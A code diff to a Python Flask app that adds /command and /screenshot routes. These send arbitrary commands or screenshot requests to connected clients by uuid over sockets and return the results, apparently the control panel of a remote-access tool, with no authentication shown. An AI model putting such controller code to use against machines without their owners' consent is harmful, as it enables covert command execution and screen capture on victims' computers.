@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, request, render_template
+from flask import Flask, jsonify, request, render_template, send_file
 from server import *
 
 
@@ -30,6 +30,34 @@ def server_status():
         return 'online'
     else:
         return 'offline'
+
+@app.route('/command', methods=['GET'])
+def command():
+    if not connection_thread.is_alive(): return ''
+    client_uuid = request.args.get('uuid', '')
+    command = request.args.get('cmd', '')
+    if not client_uuid in online_clients.keys(): return ''
+    client_socket = online_clients[client_uuid][0]
+    with client_locks[client_uuid]:
+        Protocol(extension='command').upmeta({
+            'command':command
+        }).create_stream(client_socket.send)
+        response = Protocol().load_stream(client_socket.recv).json
+    return str(response)
+
+@app.route('/screenshot', methods=['GET'])
+def screenshot():
+    if not connection_thread.is_alive(): return ''
+    client_uuid = request.args.get('uuid', '')
+    if not client_uuid in online_clients.keys(): return ''
+    client_socket = online_clients[client_uuid][0]
+    with client_locks[client_uuid]:
+        Protocol(extension='command').upmeta({
+            'command':'screenshot'
+        }).create_stream(client_socket.send)
+        respond = Protocol().load_stream(client_socket.recv)
+        
+    return send_file(respond, mimetype='image/jpeg')
 
 @app.route('/')
 def index():
